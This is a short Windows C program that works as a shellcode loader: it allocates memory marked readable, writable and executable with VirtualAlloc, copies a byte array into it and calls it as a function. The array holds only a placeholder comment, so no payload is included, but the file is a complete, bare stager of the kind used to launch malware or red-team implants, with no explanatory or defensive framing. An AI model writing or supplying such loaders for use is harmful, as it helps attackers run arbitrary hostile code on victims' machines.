#include <windows.h>

unsigned char buf[] = { /* <shellcode> */ };

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    unsigned char* dst = (unsigned char*)exec;
    for (unsigned int i = 0; i < sizeof(buf); i++) dst[i] = buf[i];
    ((void(*)())exec)();
    return 0;
}
